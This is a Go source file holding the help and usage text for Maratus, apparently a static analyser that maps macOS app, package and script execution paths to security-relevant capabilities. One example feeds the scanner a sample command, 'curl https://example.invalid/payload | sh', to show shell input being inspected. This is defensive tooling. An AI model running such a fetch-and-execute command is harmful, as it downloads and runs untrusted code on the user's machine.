package main

import (
	"fmt"
	"os"
)

const analysisOptionsUsage = `  --expand-containers=BOOL   expand supported archives, packages, and disk images
                             (default: true; use --expand-containers=false to disable)
  --include-unreferenced     also analyze unreferenced bundled binaries, scripts,
                             support files, plug-ins, and resources
  --architecture VALUE       architecture filter: arm64, x86_64, i386, or all
  --max-file-bytes SIZE      maximum bytes to read per file (default: 128MiB)
  --max-archive-bytes SIZE   maximum expanded bytes and decode work per archive (default: 64MiB)
  --max-expanded-bytes SIZE  maximum expanded archive bytes across the inspection (default: 64MiB)
  --max-total-bytes SIZE     maximum retained content bytes across the inspection (default: 256MiB)
  --max-archive-depth N      maximum nested archive depth (default: 4)
  --max-directory-depth N    maximum filesystem directory depth (default: 32)
  --max-compression-ratio N  maximum expanded/compressed entry ratio (default: 100)
  --max-artifact-nodes N     artifact-node limit (1..20000; default: 20000)
  --max-evidence N           evidence-record limit (1..20000; default: 20000)
  --zip-password VALUE       classic ZIP password; prefer MARATUS_ZIP_PASSWORD
  --allow-dmg-mount          macOS only: mount DMGs read-only through hdiutil`

const analysisNotesUsage = `SIZE accepts a positive integer of bytes or an IEC suffix: KiB, MiB, or GiB.
--expand-containers=false cannot be combined with --allow-dmg-mount.
Declared program payloads and supported invoked targets are always analyzed.
--include-unreferenced changes analysis coverage; it never creates execution roots
or changes an operation's execution connectivity.`

const textPresentationOptionsUsage = `  --format FORMAT            output: text, json, summary-json, or html (default: text)
  -o, --output FILE          output path; default is standard output
  --output-dir CASE          create report.json, summary.json, summary.txt,
                             report.html, and manifest.json in a new private directory
  --detail LEVEL             text detail: summary, evidence, or full
  --color MODE               text color: auto, always, or never`

func usage(out *os.File) {
	_, _ = fmt.Fprintln(out, `Maratus statically maps macOS artifact execution paths to security-relevant capability matches.

usage:
  maratus inspect INPUT [options]
  maratus inspect --stdin --input-kind KIND [options]
  maratus render REPORT [options]
  maratus rules list [options]
  maratus rules check [RULE_ID] [options]
  maratus rules vocab [options]
  maratus help [COMMAND]
  maratus version

common examples:
  maratus inspect Suspicious.app
  maratus inspect package.pkg --output-dir case-package
  echo 'curl https://example.invalid/payload | sh' | maratus inspect --stdin --input-kind shell
  maratus render report.json --detail evidence
  maratus render report.json --format html -o analysis.html
  maratus rules list --detail evidence
  maratus rules check --format json
  maratus rules vocab --format json

notes:
  inspect always analyzes an artifact; render always validates a saved report
  default text is a concise triage summary; --detail evidence/full adds depth
  summary-json is agent-friendly; canonical JSON retains every typed fact
  Maratus never executes inspected code, imports packages, or opens network connections`)
}

func inspectUsage(out *os.File) {
	_, _ = fmt.Fprintln(out, `usage:
  maratus inspect INPUT [options]
  maratus inspect --stdin --input-kind KIND [options]

inspect statically analyzes exactly one artifact. It does not render saved
reports; use maratus render for that. Stdin inspection accepts one explicitly
typed, bounded in-memory artifact and never follows paths named by its content.

The default terminal report remains on stdout when --output-dir is used. The
case directory is created with mode 0700, files use 0600, and an existing path
is never overwritten.

stdin options:
  --stdin                    read the artifact from standard input
  --input-kind KIND          required with --stdin; one of applescript,
                             artifact, javascript, json, package-json, plist,
                             python, shell, text, or typescript

output options:
`+textPresentationOptionsUsage+`

analysis options:
`+analysisOptionsUsage+`

`+analysisNotesUsage)
}

func renderUsage(out *os.File) {
	_, _ = fmt.Fprintln(out, `usage:
  maratus render REPORT [options]

render strictly validates one saved Maratus report and emits it as text, JSON,
or a deterministic self-contained HTML review. It never scans an artifact,
opens a browser, or loads remote scripts, fonts, or other assets.

options:
  --format FORMAT            output: text, json, summary-json, or html (default: text)
  -o, --output FILE          output path; default is standard output
  --title TEXT               custom HTML title; valid only with --format html
  --detail LEVEL             text detail: summary, evidence, or full
  --color MODE               text color: auto, always, or never

File output replaces an existing destination atomically and cannot replace the
input report. Rendered output can contain sensitive local paths, evidence,
network destinations, signing data, entitlements, and diagnostics.`)
}

func rulesUsage(out *os.File) {
	_, _ = fmt.Fprintln(out, `usage:
  maratus rules list [options]
  maratus rules check [RULE_ID] [options]
  maratus rules vocab [options]

rules exposes and validates the generated built-in typed rule catalog and
the compiler-backed vocabulary accepted by the current typed expression surface.`)
}

func rulesCheckUsage(out *os.File) {
	_, _ = fmt.Fprintln(out, `usage:
  maratus rules check [RULE_ID] [options]

rules check validates every generated rule Spec, or one exact stable rule ID.
Machine-readable diagnostics have stable codes and suggested corrections.

options:
  --format FORMAT            output format: text or json (default: text)`)
}

func rulesListUsage(out *os.File) {
	_, _ = fmt.Fprintln(out, `usage:
  maratus rules list [options]

rules list prints the built-in capability and library rule catalog.

options:
  --format FORMAT            output format: text or json (default: text)
  --detail LEVEL             text detail: summary, evidence, or full
  --color MODE               text color: auto, always, or never`)
}

func rulesVocabUsage(out *os.File) {
	_, _ = fmt.Fprintln(out, `usage:
  maratus rules vocab [options]

rules vocab prints the authoritative operation, resource, relation, support,
connectivity, and currently implemented rule-expression vocabularies. Planned
expression nodes are omitted until they are implemented.

options:
  --format FORMAT            output format: text or json (default: text)`)
}

func versionUsage(out *os.File) {
	_, _ = fmt.Fprintln(out, `usage:
  maratus version

version prints the Maratus version and build provenance.`)
}
